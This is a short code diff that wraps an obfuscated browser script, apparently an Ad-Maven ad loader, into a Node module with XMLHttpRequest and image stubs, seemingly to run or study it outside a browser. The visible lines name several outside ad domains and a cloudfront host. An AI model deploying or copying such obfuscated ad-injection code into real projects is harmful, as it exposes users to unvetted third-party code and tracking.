@@ -1,3 +1,6 @@
+var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
+var Image = require("images");
+exports.selff=function(window){
 (function() {
   function m(b) {
     function c(b) {
@@ -4038,3 +4041,4 @@
     }
   })[(f7V.W3 + f7V.U8T + f7V.I8q + f7V.Q4T)](window, arguments);
 })(2, 60000, 607682, "magifirst.com", 7, 2, 0, 3600, "somethodox.info", 0, [], 1, [], [], false, "Ad-Maven", 5000, {}, "signoredom.com", 0, 1, 0.9, [], 0, "//d2yjxa7gi6wm99.cloudfront.net", 1, 2, 0);
+}
